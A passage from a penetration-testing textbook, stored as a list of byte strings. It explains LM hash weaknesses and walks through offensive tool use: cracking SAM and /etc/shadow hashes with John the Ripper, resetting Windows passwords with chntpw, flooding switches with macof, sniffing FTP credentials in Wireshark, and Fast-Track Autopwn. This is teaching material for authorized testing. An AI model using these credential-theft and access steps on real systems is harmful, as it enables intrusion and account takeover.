entire password \n', b'is converted to uppercase. converting all the characters used in a password to \n', b'uppercase is a fundamental flaw that greatly reduces the strength of any pass-\n', b'word. this is because technically if we hash the word \xe2\x80\x9cPassword\xe2\x80\x9d and \xe2\x80\x9cpass-\n', b'word,\xe2\x80\x9d even though they are only different by a single case of a single letter, \n', b'these two words will produce a different hash output. However, because lm \n', b'hashes convert every character to upper case, we greatly reduce the number of \n', b'guesses we need to make. instead of requiring an attacker to guess \xe2\x80\x9cPassword,\xe2\x80\x9d \n', b'\xe2\x80\x9cPassword,\xe2\x80\x9d \xe2\x80\x9cPAssword,\xe2\x80\x9d and so on, with every possible combination of upper \n', b'and lower case letters, the attacker only needs to make the single guess of \n', b'\xe2\x80\x9cPAssword.\xe2\x80\x9d\n', b'to further compound this issue, every lan manager password is 14 characters \n', b'in length. if a password is less than 14 characters, the missing letters are filled \n', b'in with null values. if a password is greater than 14 characters, the password is \n', b'truncated at 14 characters.\n', b'the final nail in the coffin of lan manager passwords (as if it needed another) \n', b'is the fact that all stored passwords, which are now 14 characters in length, \n', b'actually get split in half and stored as two individual 7-character passwords. \n', b'the length of a password is one source of its strength; unfortunately because of \n', b'the lm design, the max password that needs to be cracked is 7 characters. John \n', b'will actually attempt to crack each of the 7-character halves of the password \n', b'individually and typically makes very short work out of it.\n', b'take a moment to consider these flaws. when taken together, they represent \n', b'quite a blow to the security of any system. suppose our favorite network \n', b'Admin, Ben owned is utilizing lm hashes on his windows machine. He is \n', b'aware of the dangers of weak passwords so he creates the following password, \n', b'which he believes is secure: supersecretPassword!@#$.\n', b'fIGURE 4.9\n', b'Extracting and Viewing the Password Hashes with Samdump2.\n', b'\x0cExploitation ChApTER 4\n', b'87\n', b'Unfortunately for Ben, he is operating under a false sense of security. His complex \n', b'password will actually undergo a series of changes that make it much less secure. \n', b'first the password is converted to all uppercase: sUPersecretPAssword!@#$. \n', b'next the password is truncated to be exactly 14 characters, with any remain-\n', b'ing letters simply discarded. the new password is: sUPersecretPAs. finally, \n', b'the password is broken into equal halves of 7 characters each: sUPerse and \n', b'cretPAs.\n', b'when a hacker or penetration tester gets ahold of Ben\xe2\x80\x99s password, the attacker \n', b'has to crack two simple, all-uppercase, 7-character passwords. that is a drasti-\n', b'cally simpler task than the original password of supersecretPassword!@#$.\n', b'fortunately, microsoft addressed these issues and now uses a much more \n', b'secure algorithm called ntlm to create its password hashes. However, as a \n', b'penetration tester you will still find systems which are utilizing and storing lm \n', b'hashes. modern versions of windows do not use or store lm hashes by default; \n', b'however, there are options to enable lm on these systems. this \xe2\x80\x9cfeature\xe2\x80\x9d is \n', b'implemented to support backward compatibility with legacy systems. As a side \n', b'note, you should always upgrade, or discontinue the use of any legacy software \n', b'that requires you to use lm hashes. old systems often put your entire network \n', b'at risk.\n', b'John the ripper is capable of cracking passwords by using a password dic-\n', b'tionary or by brute forcing letter combinations. As we discussed earlier, pass-\n', b'word dictionaries are lists of words and letter combinations. one advantage of \n', b'using a password dictionary is that it is very efficient. the main disadvantage \n', b'of this technique is that if the exact password is not in the dictionary, John \n', b'the ripper will be unsuccessful. Another method for cracking passwords is to \n', b'brute force letter combinations. Brute forcing letter combinations means that \n', b'the password cracker will generate passwords in a sequential order until it has \n', b'exhausted every possible combination. for example, the password cracker will \n', b'begin by guessing the password as a single letter: \xe2\x80\x9ca.\xe2\x80\x9d if that guess is unsuccess-\n', b'ful, it will try \xe2\x80\x9caa.\xe2\x80\x9d if that guess is unsuccessful, it will move to \xe2\x80\x9caaa\xe2\x80\x9d and so on. \n', b'this process is typically much slower than a dictionary guessing attack, but the \n', b'advantage is that given enough time, the password will eventually be found. if \n', b'we try every letter in every possible combination, there is simply nowhere for a \n', b'password to hide. However, it is important to point out that brute forcing pass-\n', b'words of significant length and cipher would take many lifetimes to crack.\n', b'John the ripper is built into Backtrack. to run it, we can simply enter the fol-\n', b'lowing command into a terminal:\n', b'john\n', b'invoking this command will actually run a script that will move us to the /pen-\n', b'test/passwords/jtr directory. once inside the /pentest/passwords/jrt directory, \n', b'we can issue the following command:\n', b'./john /tmp/hashes.txt\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'88\n', b'in the command above \xe2\x80\x9c./john\xe2\x80\x9d is used to invoke the password cracking John \n', b'the ripper program. do not omit the \xe2\x80\x9c./\xe2\x80\x9d before the john command. this \n', b'forces linux to run the program in the current directory. the next command \xe2\x80\x9c/\n', b'tmp/hashes.txt\xe2\x80\x9d is used to specify the location of the hashes that we extracted \n', b'using samdump2. if you saved your hashes.txt file to a different location, you \n', b'will need to change this path.\n', b'if your target machine is using ntlm hashes, you will need to add the \xe2\x80\x9c-f:nt\xe2\x80\x9d \n', b'switch. in this case, the command would look like the following:\n', b'./john /tmp/hashes.txt \xe2\x80\x93f:NT\n', b'After issuing the appropriate command to instruct John the ripper to run, the \n', b'program will attempt to crack the passwords contained in the hashes.txt file. \n', b'when John is successful in finding a password, it will display it to the screen. \n', b'figure 4.10 shows the commands used to move into the John directory, running \n', b'John the ripper, and the output of usernames and passwords that were cracked.\n', b'Below you will find a brief recap of the steps used to crack windows passwords. \n', b'it is important that you practice and fully understand how to complete each of \n', b'the steps below. if you are given physical access to a machine, you should be \n', b'able to complete steps 1\xe2\x80\x934 in less than five minutes. the time it takes to com-\n', b'plete step 5, the actual cracking of the passwords, will vary depending on your \n', b'resources and the quality or strength of the passwords you are cracking. You \n', b'should also become comfortable enough with each of the steps that you can \n', b'perform them without the aid of notes or a cheat sheet:\n', b'1. shut down the target machine.\n', b'2. Boot the target to Backtack.\n', b'3. mount the local hard drive.\n', b'4. Use samdump2 to extract the hashes.\n', b'5. Use John the ripper to crack the passwords.\n', b'the process of cracking linux and osx passwords is much the same as the \n', b'method described above with a few slight modifications. linux systems do not \n', b'fIGURE 4.10\n', b'Cracked Passwords with John the Ripper.\n', b'\x0cExploitation ChApTER 4\n', b'89\n', b'use a sAm file to store the password hashes. rather the encrypted linux pass-\n', b'word hashes are contained in a file called the \xe2\x80\x9cshadow\xe2\x80\x9d file which is located at: \n', b'/etc/shadow.\n', b'However, before you can use the /etc/shadow file with John the ripper, it must be \n', b'joined with the /etc/passwd file. in many respects this is similar to how we had to \n', b'use the \xe2\x80\x9csystem\xe2\x80\x9d file with the sAm file to extract windows password hashes. John \n', b'the ripper includes a function to combine the shadow and password files so you \n', b'can continue cracking the passwords. to accomplish this task, you need to use the \n', b'\xe2\x80\x9cunshadow\xe2\x80\x9d command, which is located in the /pentest/passwords/jtr directory. \n', b'to accomplish this, issue the following command in a terminal:\n', b'./unshadow /etc/passwd /etc/shadow \xee\x80\xae /tmp/linux_hashes.txt\n', b'Here again, it is important not to forget the \xe2\x80\x9c./\xe2\x80\x9d in front of the \xe2\x80\x9cunshadow\xe2\x80\x9d \n', b'command. this command will join the /etc/passwd with the /etc/shadow file \n', b'and store the results in a file called \xe2\x80\x9clinux_hashes.txt\xe2\x80\x9d in the /tmp directory.\n', b'now that we have extracted the hashes, we are almost ready to begin cracking \n', b'the linux passwords. However, before we can start, we need to use a version of \n', b'John the ripper that supports cracking different types of password hashes. if \n', b'you use a wrong version or an unpatched version of John the ripper, the pro-\n', b'gram will return a message saying, \xe2\x80\x9cno password hashes loaded.\xe2\x80\x9d most mod-\n', b'ern linux systems store their passwords using the sHA hashing algorithm. with \n', b'this in mind, we have two choices: we can either patch the version of John the \n', b'ripper or download a prepatched version. if you are unfamiliar with the patch-\n', b'ing process and manually compiling linux source code, it may be easier to find \n', b'a prepatched version that supports sHA hashes. once we have the correct ver-\n', b'sion of John the ripper running, we can complete this task by issuing the fol-\n', b'lowing command from inside the /pentest/passwords/jtr directory:\n', b'./john /tmp/linux_hashes.txt\n', b'John the ripper contains many more options and switches that can be used to \n', b'greatly improve your cracking time and chances of success. You should spend \n', b'some time learning about each of these switches.\n', b'pASSWORD RESETTING: KIND Of LIKE DRIvING A \n', b'BULLDOZER ThROUGh ThE SIDE Of A BUILDING\n', b'there is another option for defeating passwords. this technique requires phys-\n', b'ical access to the target machine, and although it is very effective at gaining \n', b'you access to the target, it is also very noisy. in the previous section password \n', b'cracking was discussed. if a skilled penetration tester is able to access a target \n', b'machine alone for just a few minutes, he or she should be able to get a copy of \n', b'the password hashes. All things considered, this could be a very stealthy attack \n', b'and difficult to detect. in most cases, the penetration tester will leave few clues \n', b'that he or she were ever on the target machine. remember the penetration tes-\n', b'ter can take the passwords off-site and crack them at his or her leisure.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'90\n', b'Password resetting is another technique that can be used to gain access to a \n', b'system or to escalate privileges; however, this method is much less subtle than \n', b'password cracking. when first introducing this topic, it is common to compare \n', b'gaining access to a windows machine by performing a password reset to a bur-\n', b'glar driving a bulldozer through the wall of a store in order to gain access to \n', b'the premises. it may be effective, but you can be sure that the storeowner and \n', b'employees will know that they were broken into.\n', b'Password resetting is a technique that allows an attacker to literally overwrite \n', b'the sAm file and create a new password for any user on a modern windows \n', b'system. this process can be performed without ever knowing the original pass-\n', b'word, although it does require you to have physical access to the machine.\n', b'As with all other techniques discussed in this book, it is vital that you \n', b'have authorization before proceeding with this attack. it is also important \n', b'you understand the implications of this technique. once you change the  \n', b'password, there will be no way to restore it. As described in the beginning \n', b'of this section, it is very much like a burglar driving a bulldozer through the  \n', b'side of a building. the next time a user attempts to log in and he or she finds \n', b'that the password has been changed, you can bet that someone is going to \n', b'notice.\n', b'with that in mind, this is still an incredibly powerful technique and one that \n', b'can be very handy for gaining access to a system. to perform password reset-\n', b'ting, you will need to boot the target system to a Backtrack dVd. once booted, \n', b'from the terminal you will need to mount the physical hard drive of the system \n', b'containing the sAm file. You can find the instructions for performing this task \n', b'in the previous section. After mounting the hard drive, you need to navigate to \n', b'the \xe2\x80\x9c/pentest/passwords/chntpw\xe2\x80\x9d directory. You can accomplish this by enter-\n', b'ing the following command:\n', b'cd /pentest/passwords/chntpw\n', b'from here you can run the \xe2\x80\x9cchntpw\xe2\x80\x9d command to reset the password. to \n', b'review the full options and available switches, you can issue the following \n', b'command:\n', b'./chntpw \xe2\x80\x93h\n', b'Assume that you want to reset the administrator password on your target \n', b'machine. to accomplish this, you would issue the following command:\n', b'./chntpw \xe2\x80\x93i /mnt/sda1/WINDOWS/system32/config/SAM\n', b'in the command above, the \xe2\x80\x9c./chntpw\xe2\x80\x9d is used to start the password resetting \n', b'program. the \xe2\x80\x9c-i\xe2\x80\x9d is used to run the program interactively and allow you to \n', b'choose the user you would like reset. the \xe2\x80\x9c/mnt/sda1/windows/system32/\n', b'config/sAm\xe2\x80\x9d is the mounted directory containing the sAm file of our target \n', b'machine. it is important to make sure you have access to the sAm file; remem-\n', b'ber not all drives are listed as sda1. As mentioned earlier, running the \xe2\x80\x9cfdisk \n', b'\xe2\x80\x93l\xe2\x80\x9d command can be helpful in determining the appropriate drive.\n', b'\x0cExploitation ChApTER 4\n', b'91\n', b'After running the \xe2\x80\x9c./chntpw \xe2\x80\x93i /mnt/sda1/windows/system32/config/sAm\xe2\x80\x9d \n', b'command, you will be presented with a series of interactive menu-driven \n', b'options that will allow you to reset the password for the desired user. each of \n', b'the steps is very clearly laid out and described; you simply need to take a few \n', b'moments to read what is being asked. the program is actually designed with a \n', b'series of \xe2\x80\x9cdefault\xe2\x80\x9d answers and in most cases you can simply hit the \xe2\x80\x9center\xe2\x80\x9d key \n', b'to accept the default choice.\n', b'As shown in figure 4.11, after loading, the first question you are asked is: \n', b'\xe2\x80\x9cwhat to do [1]?\xe2\x80\x9d Above the question you will see a series of five options to \n', b'choose from. simply enter the number or letter that corresponds to the choice \n', b'you want to make and hit the \xe2\x80\x9center\xe2\x80\x9d key to continue. the \xe2\x80\x9c[1]\xe2\x80\x9d after the ques-\n', b'tion indicates that choice \xe2\x80\x9c1\xe2\x80\x9d is the default.\n', b'in our example we are planning to reset the password for the administrator \n', b'account, so we can type \xe2\x80\x9c1\xe2\x80\x9d and hit enter or simply hit the enter key to accept \n', b'the default. next we are presented with a list of users available on the local \n', b'windows machine. You can select the desired user by typing in his or her user-\n', b'name as displayed. once again, the default option is set to \xe2\x80\x9cAdministrator.\xe2\x80\x9d \n', b'figure 4.12 shows a screenshot of the available users.\n', b'Here again, we can simply hit the \xe2\x80\x9center\xe2\x80\x9d key to accept the default choice of \n', b'\xe2\x80\x9cAdministrator.\xe2\x80\x9d next we are presented with the various options for editing the \n', b'fIGURE 4.11\n', b'Chntpw Interactive Menu.\n', b'fIGURE 4.12\n', b'List of Available Users to Reset Password.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'92\n', b'user on the target machine as shown in figure 4.13. Please note that at this \n', b'step you do not want to accept the default option!\n', b'As previously mentioned, at this point you want to be sure you select option \n', b'\xe2\x80\x9c1\xe2\x80\x9d to clear the password. After entering your selection to clear the user pass-\n', b'word, you will get a message stating: \xe2\x80\x9cPassword cleared!\xe2\x80\x9d At this point you can \n', b'reset another user\xe2\x80\x99s password or enter \xe2\x80\x9c!\xe2\x80\x9d to quit the program. it is important \n', b'that you complete the remaining steps because at this point the new sAm file \n', b'has not been written to the hard drive. in the menu that follows enter \xe2\x80\x9cq\xe2\x80\x9d to \n', b'quit the chntpw program. At last you will be prompted with a message asking \n', b'if you would like to write your changes to the hard drive. Be sure to enter \xe2\x80\x9cy\xe2\x80\x9d at \n', b'this step as the default is set to \xe2\x80\x9cn.\xe2\x80\x9d\n', b'the password for the selected user has now been cleared and is blank. You can \n', b'shut down Backtrack by issuing the \xe2\x80\x9creboot\xe2\x80\x9d command and ejecting the dVd. \n', b'when windows restarts, you can log into the account by leaving the password \n', b'blank.\n', b'with a little practice, this entire process, including booting Backtrack, clearing \n', b'the password, and booting into windows, can be completed in less than five \n', b'minutes.\n', b'SNIffING NETWORK TRAffIC\n', b'Another popular technique that can be used to gain access to systems is net-\n', b'work sniffing. sniffing is the process of capturing and viewing traffic as it is \n', b'passed along the network. several popular protocols in use today still send \n', b'sensitive and important information over the network without encryption. \n', b'network traffic sent without using encryption is often referred to as clear text \n', b'because it is human readable and requires no deciphering. sniffing clear text \n', b'network traffic is a trivial but effective means of gaining access to systems.\n', b'Before we begin sniffing traffic, it is important that you understand some basic \n', b'network information. the difference between promiscuous mode and nonpro-\n', b'miscuous network modes will be discussed first.\n', b'By default most network cards operate in nonpromiscuous mode. non-\n', b'promiscuous mode means that the network interface card (nic) will only \n', b'pass on the specific traffic that is addressed to it. if the nic receives traffic that \n', b'matches its address, the nic will pass the traffic onto the cPU for processing. \n', b'fIGURE 4.13\n', b'Chntpw User Edit Menu.\n', b'\x0cExploitation ChApTER 4\n', b'93\n', b'if the nic receives traffic that does not match its address, the nic simply dis-\n', b'cards the packets. in many ways, a nic in nonpromiscuous mode acts like a \n', b'ticket taker at a movie theater. the ticket taker stops people from entering the \n', b'theater unless they have a ticket for the specific show.\n', b'Promiscuous mode on the other hand is used to force the nic to accept all \n', b'packets that arrive. in promiscuous mode, all network traffic is passed onto the \n', b'cPU for processing regardless of whether it was destined for the system or not.\n', b'in order to successfully sniff network traffic that is not normally destined for \n', b'your Pc, you must make sure your network card is in promiscuous mode.\n', b'You may be wondering how it is possible that network traffic would arrive at \n', b'a computer or device if the traffic was not addressed to the device. there are \n', b'several possible scenarios where this situation may arise. first any traffic that is \n', b'broadcast on the network will be sent to all connected devices. Another exam-\n', b'ple is networks that use hubs rather than switches to route traffic.\n', b'A hub works by simply sending all the traffic it receives to all the devices con-\n', b'nected to its physical ports. in networks that use a hub, your nic is constantly \n', b'disregarding packets that do not belong to it. for example, assume we have a \n', b'small 8-port hub with 8 computers plugged into the hub. in this environment \n', b'when the Pc plugged into port number 1 wants to send a message to the Pc \n', b'plugged into port number 7, the message (network traffic) is actually delivered \n', b'to all the computers plugged into the hub. However, assuming all the computers \n', b'are in nonpromiscuous mode, machines 2\xe2\x80\x936 and 8 simply disregard the traffic.\n', b'many people believe you can fix this situation by simply swapping your hubs \n', b'with switches. this is because unlike hubs that broadcast all traffic to all ports, \n', b'switches are much more discrete. when you first plug a computer into a switch, \n', b'the mAc address of the computer\xe2\x80\x99s nic is registered with the switch. this \n', b'information (the computer\xe2\x80\x99s mAc address and switch\xe2\x80\x99s port number) is then \n', b'used by the switch to intelligently route traffic for a specific machine to the spe-\n', b'cific port. going back to your previous example, if a switch is being used and \n', b'Pc 1 sends a message to Pc 7, the switch processes the network traffic and con-\n', b'sults the table containing the mAc address and port number. it then sends the \n', b'message to only the computer connected to port number 7. devices 2\xe2\x80\x936 and 8 \n', b'never receive the traffic.\n', b'MACOf: MAKING ChICKEN SALAD OUT Of  \n', b'ChICKEN Sh*T\n', b'it should be pointed out that the discrete routing property of a switch was orig-\n', b'inally designed to increase performance, not to increase security. As a result of \n', b'this, any increase in security should be viewed as a by-product of the design \n', b'rather than its original goal. keeping this in mind, before you run out to \n', b'replace all your hubs with switches, you should be aware that there are tools \n', b'available that can be used against a switch to make it act like a hub. in other \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'94\n', b'words, in some instances, we can cause a switch to broadcast all traffic to all \n', b'ports making it behave exactly like a hub.\n', b'most switches have a limited amount of memory that can be used to remem-\n', b'ber the table containing mAc address and corresponding port numbers. By \n', b'exhausting this memory and flooding the table with bogus mAc addresses, a \n', b'switch will often become incapable of reading or accessing valid entries in the \n', b'mAc to port table. Because the switch cannot determine the correct port for \n', b'a given address, the switch will simply broadcast the traffic to all ports. this \n', b'model is known as \xe2\x80\x9cfail open.\xe2\x80\x9d the concept of fail open simply means that \n', b'when the switch fails to properly and discretely route traffic, it falls back to a \n', b'hub-like state (open) that sends all traffic to all ports.\n', b'You should be aware that some switches are configured to \xe2\x80\x9cfail closed.\xe2\x80\x9d \n', b'switches that fail closed operate in exactly the opposite manner of a fail open \n', b'switch. rather than broadcasting all traffic to all ports, fail closed switches sim-\n', b'ply stop routing traffic altogether. However, as a penetration tester or hacker, \n', b'there is an upside to this configuration as well. if you are able to prevent the \n', b'switch from routing traffic, you have stopped all traffic on the network and \n', b'caused a denial of service.\n', b'dsniff is an excellent collection of tools that provide many useful functions \n', b'for sniffing network traffic. it is recommended that you take time and review \n', b'each of the tools and documentation included with dsniff. one of the dsniff \n', b'tools written by dug song, called macof, provides us with the ability to flood a \n', b'switch with thousands of random mAc addresses. if the switch is configured to \n', b'fail open, the switch will begin to act like a hub and broadcast all traffic to all \n', b'ports. this will allow you to overcome the selective routing of a switch and sniff \n', b'all network traffic passing through the device. macof is built into Backtrack and \n', b'can be run by issuing the following command in a terminal window:\n', b'macof \xe2\x80\x93i eth0 \xe2\x80\x93s 172.16.45.123 \xe2\x80\x93d 172.16.45.2\n', b'in the preceding example, \xe2\x80\x9cmacof\xe2\x80\x9d is used to invoke the program. the \n', b'macof program will generate and flood the network with thousands of mAc \n', b'addresses. the \xe2\x80\x9c-i\xe2\x80\x9d switch is used to specify your computer\xe2\x80\x99s network card. \n', b'this is where the mAc addresses will be sent from. the \xe2\x80\x9c-s\xe2\x80\x9d is used to specify \n', b'the source address. the \xe2\x80\x9c-d\xe2\x80\x9d is used to specify the destination or target of your \n', b'attack. figure 4.14 shows an example of the command used to start macof, and \n', b'a selection of the generated output.\n', b'As a final word of caution, using macof will generate tremendous amounts of \n', b'network traffic and is therefore easily detectable. You should use this technique \n', b'only when stealth is not a concern.\n', b'with the concepts of promiscuous mode and the ability to sniff traffic on a \n', b'switch in mind, you can examine another popular tool that can be used to \n', b'view and capture network traffic. one of the simplest and most powerful tools \n', b'for sniffing network traffic is wireshark. wireshark was originally written by \n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'95\n', b'gerald combs in 1998. this popular tool is a free network protocol analyzer \n', b'that allows you to quickly and easily view and capture network traffic. You \n', b'can download wireshark for free from http://www.wireshark.org. wireshark is \n', b'an extremely flexible and mature tool. it should be noted that prior to 2006 \n', b'wireshark was known as ethereal. even though the program remained the \n', b'same, the name was changed due to some trademark issues.\n', b'wireshark is built into Backtrack and can be accessed through the k-menu \n', b'dragon by selecting: k-menu \xe2\x86\x92 Backtrack \xe2\x86\x92 Privilege escalation \xe2\x86\x92 sniffers \xe2\x86\x92 \n', b'wireshark as shown in figure 4.15.\n', b'remember that by default Backtrack does not turn enable or start any of your \n', b'network interfaces. Be sure that you have enabled and configured at least one \n', b'network interface in Backtrack before running wireshark. the instructions for \n', b'doing this can be found in chapter 1.\n', b'when you first start wireshark inside of Backtrack, you will get a message tell-\n', b'ing you that \xe2\x80\x9crunning wireshark as user \xe2\x80\x98root\xe2\x80\x99 can be dangerous.\xe2\x80\x9d You can \n', b'fIGURE 4.14\n', b'Using Macof to Flood a Switch.\n', b'fIGURE 4.15\n', b'Starting Wireshark through the K-Start Menu.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'96\n', b'click \xe2\x80\x9cok\xe2\x80\x9d to acknowledge this warning. when you first start wireshark you \n', b'will need to select your network card and ensure that it is properly set up to \n', b'capture all available traffic. You can do this by clicking on the icon showing \n', b'a network card and a menu list. the icon is located in the upper left corner of \n', b'the program. figure 4.16 shows a screenshot of the button.\n', b'selecting the \xe2\x80\x9clist available capture interfaces\xe2\x80\xa6\xe2\x80\x9d button will bring up a new \n', b'window displaying all the available interfaces. from here you will be able to \n', b'view and select the appropriate interface. You can begin a simple capture by \n', b'accepting the defaults and clicking on the \xe2\x80\x9cstart\xe2\x80\x9d button associated with the \n', b'desired nic or you can customize your capture options by clicking on the \n', b'\xe2\x80\x9coptions\xe2\x80\x9d button. figure 4.17 shows an example of the wireshark capture \n', b'interfaces window.\n', b'Because we are focusing on the basics, we will leave the default options and \n', b'select the \xe2\x80\x9cstart\xe2\x80\x9d button. the wireshark capture window should fill rapidly and \n', b'continue to stream packets as long as you let the capture run. do not worry \n', b'about attempting to view this information on the fly. wireshark allows us to \n', b'save the capture results and review them later.\n', b'to facilitate this example, you should start an ftP server on one of the \n', b'machines attached to the network. now that wireshark is up and running, that \n', b'is, capturing network traffic in promiscuous mode, it is possible to log into \n', b'the ftP server as the user \xe2\x80\x9cownedb.\xe2\x80\x9d After letting the wireshark capture run \n', b'for several minutes, stop the capture by clicking on the button with a network \n', b'card; a red \xe2\x80\x9cx.\xe2\x80\x9d this button is located in the menu at the top of the wireshark \n', b'capture window as shown in figure 4.18.\n', b'fIGURE 4.16\n', b'Wireshark Button to Select the Capture Interface.\n', b'fIGURE 4.17\n', b'Wireshark Capture Interfaces Window.\n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'97\n', b'once the network capture has been stopped, you are free to review the pack-\n', b'ets captured by wireshark. You should take some time to review your capture \n', b'and attempt to identify any relevant information. As shown in figure 4.19, our \n', b'packet dump was able to successfully capture the username, password, and iP \n', b'address of the ftP server! we could now use this information to log into the \n', b'ftP server.\n', b'if you performed a capture on a particularly busy network, you may find the \n', b'volume and sheer number of captured packets overwhelming. manually \n', b'reviewing a large packet capture may not be feasible. luckily wireshark \n', b'includes a filter that can be used to drill down and refine the displayed output. \n', b'revisiting our previous example, we could enter the keyword \xe2\x80\x9cftp\xe2\x80\x9d in the filter \n', b'box and click the \xe2\x80\x9cApply\xe2\x80\x9d button. this will cause wireshark to remove all pack-\n', b'ets that do not belong to the ftP protocol from our current view. obviously, \n', b'this will significantly reduce the number of packets we need to review. \n', b'wireshark includes some incredibly powerful filters. it is well worth the effort \n', b'to take the time to review and master wireshark filters. it should be pointed \n', b'out that you can always remove your current filtered view and go back to the \n', b'original packet capture by clicking the \xe2\x80\x9cclear\xe2\x80\x9d button.\n', b'fAST-TRACK AUTOpWN: BREAKING OUT ThE M-60\n', b'An earlier section described the use of metasploit as a sniper rifle for taking \n', b'down vulnerable and unpatched systems. Another tool called fast-track is \n', b'built on metasploit; but rather than requiring the penetration tester to dig for \n', b'vulnerabilities and match exploits, fast-track simply automates the entire pro-\n', b'cess. when using fast-track, the only thing a penetration tester needs to do is \n', b'to enter the target\xe2\x80\x99s iP address.\n', b'fIGURE 4.18\n', b'Stopping the Wireshark Capture.\n', b'fIGURE 4.19\n', b'Using Wireshark to Sniff FTP Credentials.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'98\n', b'there is nothing subtle or stealthy about fast-track. the tool works by con-\n', b'ducting a port scan of the target; based on the information returned from the \n', b'port scan, fast-track sprays every known or possible matching exploit against \n', b'the target. fast-track takes the \xe2\x80\x9clet\xe2\x80\x99s throw everything at the wall and see what \n', b'sticks\xe2\x80\x9d approach to exploitation. even if fast-track is successful in getting a \n', b'shell, the tool continues spraying attacks against the target until all the possible \n', b'exploits have been attempted. when used against weak targets, this will often \n', b'lead to multiple shells.\n', b'the easiest way to start fast-track is to click on the k-start dragon \xe2\x86\x92 Backtrack \n', b'\xe2\x86\x92 Penetration \xe2\x86\x92 fast track \xe2\x86\x92 fast-track webgUi as shown in figure 4.20.\n', b'once started, fast-track will open a terminal window and run a series of com-\n', b'mands. After a brief pause, firefox will automatically open to the fast-track \n', b'web page. from the main fast-track page, you can click on the Autopwn \n', b'Automation link as shown in figure 4.21.\n', b'After selecting the Autopwn Automation link, you can scroll the web page \n', b'down and find the \xe2\x80\x9center iP Address or range:\xe2\x80\x9d textbox. enter your target \n', b'iP into the text box provided and choose if you want a bind or reverse shell \n', b'on the target. once you have set these options, you can click the \xe2\x80\x9cmetasploit \n', b'Autopwn\xe2\x80\x9d link at the bottom of the page as shown in figure 4.22.\n', b'clicking the metasploit Autopwn link will cause fast-track to unleash a flood \n', b'of exploits against your target. the system will open a terminal window and \n', b'begin issuing commands automatically. this process may take several min-\n', b'utes to complete. You can watch the progress of the program as it scrolls by \n', b'in the terminal window. You will also be able to see an accurate count of the \n', b'number of remote shells that were automatically established. when fast-track \n', b'has exhausted its supply of potential exploits, you can view any and all of the \n', b'fIGURE 4.20\n', b'Starting the Fast-Track WebGUI.\n', b'Openmirrors.com\n', b'\x0cExploitation ChApTER 4\n', b'99\n', b'fIGURE 4.21\n', b'Selecting Autopwn Automation from the Fast-Track WebGUI.\n', b'fIGURE 4.22\n', b'Fast-Track Autopwn Options.\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'100\n', b'shells that were obtained by issuing the following command within the fast-\n', b'track terminal window:\n', b'sessions \xe2\x80\x93l\n', b'if fast-track was successful in creating remote access to the target machine, this \n', b'command (please note that is a dash lower case \xe2\x80\x9cl\xe2\x80\x9d) will list each shell that \n', b'was opened. to use a shell, you can issue the following in the fast-track termi-\n', b'nal window:\n', b'sessions \xe2\x80\x93i shell_id\n', b'in this command the shell_id is replaced with the session number as listed \n', b'from the \xe2\x80\x9csessions \xe2\x80\x93l\xe2\x80\x9d command. running this command will drop you into \n', b'a shell on the remote machine. figure 4.23 shows an example of both of these \n', b'commands.\n', b'At this point you have a meterpreter shell on the target machine. figure 4.24 \n', b'demonstrates using the meterpreter \xe2\x80\x9cls\xe2\x80\x9d command to list the contents of the \n', b'current directory and provides proof that our shell is interacting with the \n', b'target.\n', b'obviously at this point the exploitation phase is over for this target!\n', b'hOW DO I pRACTICE ThIS STEp?\n', b'Practicing exploitation is one of the most challenging, frustrating, time-con-\n', b'suming and rewarding experiences that can be offered to new hackers and \n', b'penetration testers. it is probably a fair assumption that if you are reading \n', b'this book you are interested in hacking. As mentioned earlier, the process of \n', b'exploitation is the single step most often associated with hacking (even though \n', b'you now know it is much more!). if you have never successfully \xe2\x80\x9cowned\xe2\x80\x9d \n', b'or exploited a target, you are in for quite a treat. the experience of gaining \n', b'fIGURE 4.23\n', b'Listing and Using Shells Generated from Fast-Track.\n', b'\x0cExploitation ChApTER 4\n', b'101\n', b'administrative access on another machine is a thrill that is both electrifying \n', b'and unique.\n', b'there are several ways to practice this step; the easiest way is to set up a vulner-\n', b'able target in your penetration-testing lab. once again, using virtual machines \n', b'is helpful because exploitation can be a very destructive process and resetting \n', b'a virtual machine is often easier and faster than reimaging a physical machine.\n', b'if you are new to exploitation, it is important that you have a few immedi-\n', b'ate successes. this will keep you from getting discouraged as you progress and \n', b'move onto more difficult targets where the exploitation process becomes more \n', b'tedious and difficult. As a result it is suggested that you start learning exploi-\n', b'tation by attacking old, unpatched versions of operating systems and software. \n', b'successfully exploiting these systems should give you motivation to learn more. \n', b'there are many examples of students becoming quickly and permanently dis-\n', b'illusioned with exploitation and hacking because they attempted to attack \n', b'the latest-greatest-fully-patched operating system and fell flat on their face. \n', b'remember this book focuses on the basics. once you master the tools and tech-\n', b'niques discussed here, you will be able to move onto the more advanced topics. \n', b'if you are new to this process, let yourself win a little and enjoy the experience.\n', b'if possible, you should try to obtain a legal copy of microsoft\xe2\x80\x99s xP to add to \n', b'your pen testing lab environment. You should be able to find a legal copy on \n', b'fIGURE 4.24\n', b'Fast-Track Proof of Concept.\n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'102\n', b'eBay, Amazon, or craigslist. Just make sure you are purchasing a genuine copy \n', b'so that you can stay on the right side of the eUlA. it is always suggested that \n', b'newcomers begin with xP because there are still abundant copies available and \n', b'there are standing exploits in the metasploit framework that will allow you to \n', b'practice your metasploit-fu.\n', b'when building your pen testing lab, it is recommended that you find the low-\n', b'est service Pack edition of xP as each service pack level patches a number of \n', b'holes and vulnerabilities. with this advice in mind, xP with no service pack \n', b'installed is best. xP sP 1 would be next best; xP sP 2 and xP sP 3 are the \n', b'least desirable. this is because microsoft introduced some significant security \n', b'changes to xP beginning with service Pack 2. However, even xP sP 3 has at \n', b'least 1 standing exploit and can still make an excellent vulnerable target.\n', b'old versions of linux are also a great source of \xe2\x80\x9cexploitable targets.\xe2\x80\x9d the crew \n', b'from Backtrack created a free metasploit training module called \xe2\x80\x9cmetasploit \n', 